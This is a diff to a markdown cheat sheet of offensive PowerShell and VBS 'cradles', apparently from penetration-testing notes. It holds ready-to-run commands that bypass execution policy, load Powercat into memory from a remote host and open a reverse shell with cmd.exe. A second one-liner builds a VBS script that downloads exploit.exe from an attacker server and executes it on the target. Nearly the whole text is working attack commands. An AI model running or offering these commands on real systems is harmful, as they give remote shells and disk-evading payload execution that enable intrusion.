@@ -47,7 +47,7 @@ powershell.exe -NoP -NonI -Exec Bypass IEX "(New-Object System.Net.WebClient).Do
 
 ## Powershell Usefull Cradles to Download Script to memory and Execute it
 
-This Example will download Powercat to memory and execute a reverse shell using Powercat
+This Example will download Powercat to memory and execute a reverse shell using Powercat without touching the disk
 
 ```
 powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).DownloadString("http://172.16.242.173/powercat.ps1"); powercat -c 172.16.242.173 -p 4444 -e cmd.exe
@@ -61,6 +61,9 @@ powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).Dow
 
 ## VBS Cradle to Download Transfer File and Execute it
 
-cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.119.142/exploit.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "exploit.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("exploit.exe")>>poc.vbs&cscript.exe poc.vbs"
+Transfer exploit.exe from your kali server to the target server and execute it
 
+```
+cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.119.142/exploit.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "exploit.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("exploit.exe")>>poc.vbs&cscript.exe poc.vbs"
+```
 
